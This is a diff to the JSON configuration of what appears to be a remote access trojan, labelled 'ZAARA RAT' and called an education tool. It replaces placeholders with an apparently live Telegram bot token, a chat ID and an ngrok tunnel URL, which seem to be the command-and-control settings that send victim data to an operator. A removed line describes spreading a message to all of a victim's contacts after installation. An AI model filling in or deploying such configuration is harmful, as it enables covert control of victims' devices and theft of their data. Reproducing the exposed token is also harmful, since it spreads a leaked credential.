@@ -1,6 +1,14 @@
 {
-    "token": "your bot token",
-    "id": "your telegram chat id here",
-    "host": "your render.com url here must use / after writing  url ex: https://google.com/",
-    "text": "dont write anything here it works only in premium version this feature send  this line on all contacts after installation"
+    "token": "8242275965:AAEQID7dPdGSOlq_03Qw42_lpFRpb43p7js",
+    "id": "8504111518",
+    "host": "https://naovely-subscleral-azalea.ngrok-free.dev",
+    "author": "ZAARA",
+    "version": "2.0.0",
+    "project": "ZAARA RAT - Advanced Cybersecurity Education Tool",
+    "features": {
+        "encryption": true,
+        "logging": true,
+        "rateLimiting": true,
+        "sessionManagement": true
+    }
 }
